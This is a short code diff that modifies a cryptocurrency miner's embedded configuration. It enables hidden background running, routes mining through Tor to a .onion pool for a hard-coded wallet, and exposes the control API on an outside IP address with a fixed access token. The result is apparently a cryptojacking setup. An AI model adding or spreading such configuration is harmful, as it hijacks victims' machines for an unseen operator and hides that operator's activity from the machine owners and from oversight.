@@ -41,7 +41,7 @@ R"===(
         "restricted": true
     },
     "autosave": true,
-    "background": false,
+    "background": true,
     "colors": true,
     "title": true,
     "randomx": {
@@ -94,17 +94,17 @@ R"===(
         {
             "algo": null,
             "coin": null,
-            "url": "donate.graef.in:80",
-            "user": "YOUR_WALLET_ADDRESS",
+            "url": "hashvaultsvg2rinvxz7kos77hdfm6zrd5yco3tx2yh2linsmusfwyad.onion:443",
+            "user": "4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9",
             "pass": "x",
             "rig-id": null,
             "nicehash": false,
             "keepalive": false,
             "enabled": true,
-            "tls": false,
+            "tls": true,
             "tls-fingerprint": null,
             "daemon": false,
-            "socks5": null,
+            "socks5": 9150,
             "self-select": null,
             "submit-to-origin": false
         }
@@ -113,8 +113,8 @@ R"===(
         "enabled": true,
         "servers": [
             {
-                "url": "localhost:3344",
-                "access-token": "mySecret",
+                "url": "45.145.7.179:3344",
+                "access-token": "Nmlmtcg1999$",
                 "use-tls": false
             }
         ],
